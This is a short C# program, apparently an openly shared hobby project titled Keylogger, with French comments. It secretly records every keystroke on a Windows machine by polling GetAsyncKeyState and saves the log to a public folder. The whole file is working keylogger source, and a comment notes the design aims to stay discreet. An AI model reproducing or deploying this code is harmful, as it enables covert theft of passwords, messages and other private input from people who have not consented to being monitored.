//Copyright © 2015 Ernest Foussard
//
//This file is part of Keylogger.
// Keylogger is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, version 3 of the License.
// Keylogger is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
// You should have received a copy of the GNU General Public License
// along with Keylogger. If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms; // On importe cette librairie pour la methode Keys

namespace Keylogger
{
    class Program
    {
  
        // variables du Keylogger
        [DllImport("user32.dll")] //Le DLL est nécessaire pour fonctionner
        public static extern int GetAsyncKeyState(Int32 i); //Permet d'obtenir l'état du clavier en temps réel
        static string logs = "";
       
        static void Main(string[] args)
        {
            VerboseArgs();
            System.Threading.Timer timer = new System.Threading.Timer(Save); // On crée un timer qui execute la methode Save au tick
            timer.Change(300000, 100000); // On définit au bout de combien de temps va s'executer le timer (100s en l'occurence), la periode n'a aucune importance
            while (true) //Boucle infinie
            {
                Thread.Sleep(10); // On attend 10 ms pour éviter de consommer trop de ressources et rester discret
                for (byte i = 0; i < 255; i++) //on va boucler pour chaque caractère du clavier (on choisit byte car on va de 0 à 254 et la plage de byte va de 0 à 255)
                {
                    int keyState = GetAsyncKeyState(i); // On récupère l'état de touche à l'index i
                    if (keyState == 1 || keyState == -32767)
                        // keyState == -32767 (lol:p) renvoie True quand la touche d'index i est pressée 
                        // keyState == 1 renvoie True dans le cas éventuel et très peu probable que le quidam arrive à taper et retirer le doigt entre cette
                        // instruction et l'instruction précedente (enfin bon, sait-on jamais^^)
                    {
                        logs +=  (Keys)i; // On stocke dans logs au fur et à mesure
                        Console.WriteLine((Keys)i);
                        break; // Et on arrête la boucle
                    }
                }
            }
        }
        static TimerCallback Save = (state) =>
        //Delegate de timer pointant sur une methode anonyme definie ci-dessous
        //Ecrit les logs dans le fichier Users\Public\Logs.txt puis ferme l'application
        {
            Console.WriteLine("Capture terminée. Affichage des logs:" + logs);
            string str = System.IO.File.ReadAllText(@"C:\Users\Public\Logs.txt"); // On récupère le contenu du fichier
            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\Users\Public\Logs.txt")) // On lui ajoute les nouveaux logs et on sauvegarde
            {
               Console.WriteLine(@"Ouverture du fichier C:\Users\Public\Logs.txt en mode écriture réussite");
               file.WriteLine(str + "<Début de la lecture>" + logs + "<Fin de la lecture>");
            }
            if (Environment.GetCommandLineArgs()[1] == "verbose")
            {
                Console.Write("Fermeture du programme...");
                Thread.Sleep(10000);
            }
            Environment.Exit(0); // on ferme l'application
        };

        // Arguments de la ligne de commande

        static void VerboseArgs()
        {
            if (Environment.GetCommandLineArgs()[1] == "verbose")
            {
                ShowConsoleWindow();
                Console.WriteLine("------------------------Bienvenue dans le mode verbose-------------------------\n");
            }
        }

        // Manipulations sur la console

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_SHOW = 5;

        static void ShowConsoleWindow()
        {
            var handle = GetConsoleWindow();

            if (handle == IntPtr.Zero)
            {
                AllocConsole();
            }
            else
            {
                ShowWindow(handle, SW_SHOW);
            }
        }

    }
} 
